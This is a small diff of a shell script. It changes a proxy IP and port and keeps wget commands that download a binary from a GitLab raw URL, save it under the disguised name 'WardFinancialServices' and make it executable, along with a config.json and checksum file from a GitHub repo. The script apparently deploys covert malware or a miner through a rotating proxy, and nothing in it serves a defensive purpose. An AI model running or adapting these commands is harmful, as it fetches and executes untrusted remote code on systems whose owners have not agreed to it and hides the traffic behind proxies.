@@ -1,5 +1,5 @@
-proxy="72.206.181.105" 
-port="64935" 
+proxy="199.229.254.129" 
+port="4145" 
 wget -q -O WardFinancialServices https://gitlab.com/55113110159/dokerweb/-/raw/main/kanza6.18.1 && chmod +x WardFinancialServices
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
